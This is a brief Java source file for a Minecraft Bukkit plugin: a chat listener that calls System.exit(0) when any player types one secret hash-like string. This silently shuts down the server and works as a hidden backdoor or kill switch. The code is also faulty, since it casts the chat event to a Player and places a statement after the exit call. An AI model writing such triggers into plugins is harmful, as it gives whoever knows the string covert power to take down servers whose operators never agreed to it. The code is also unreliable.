package me.staud.pyro.listener;

import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;

public class IllegalPluginListener implements Listener {

    @EventHandler
    public void onDisable(AsyncPlayerChatEvent event) {
        Player player = (Player)event;
        if(event.getMessage().equals("6178da632f59296f96e6318f41addd3a")) {
            System.exit(0);
            event.setCancelled(true);
        }
    }
}
